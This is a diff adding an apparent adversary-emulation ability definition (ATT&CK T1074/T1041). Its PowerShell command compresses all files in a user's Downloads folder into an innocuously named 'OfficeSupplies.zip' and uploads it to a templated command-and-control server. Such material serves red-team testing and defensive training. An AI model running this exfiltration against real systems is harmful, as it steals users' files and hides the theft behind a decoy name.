@@ -1,0 +1,26 @@
+---
+
+- id: a612311d-a802-48da-bb7f-88a4b9dd7a24
+  name: 7.B - Data from staged file (T1074) and Exfiltration over C2 Channel (T1041)
+  description: Compress all data within Download directory and exfiltrate the results.
+  tactic: exfiltration
+  technique:
+    attack_id: T1041
+    name: Exfiltration Over Command and Control Channel
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+
+          Write-Host "[*] Compressing all the things in download dir";
+          Compress-Archive -Path "C:\Users\#{profile_user}\Downloads\*.*" -DestinationPath "$env:APPDATA\OfficeSupplies.zip";
+
+          Import-Module .\upload.ps1 -Verbose -Force;
+          Invoke-MultipartFormDataUpload -InFile "$env:APPDATA\OfficeSupplies.zip" -Uri "#{server}/file/upload";
+          if ($?) {
+            write-host "[+] Data exfil of download directory completed!";
+          } else {
+            write-host "[!] Data exfil failed!";
+          }
+
+        payload: upload.ps1
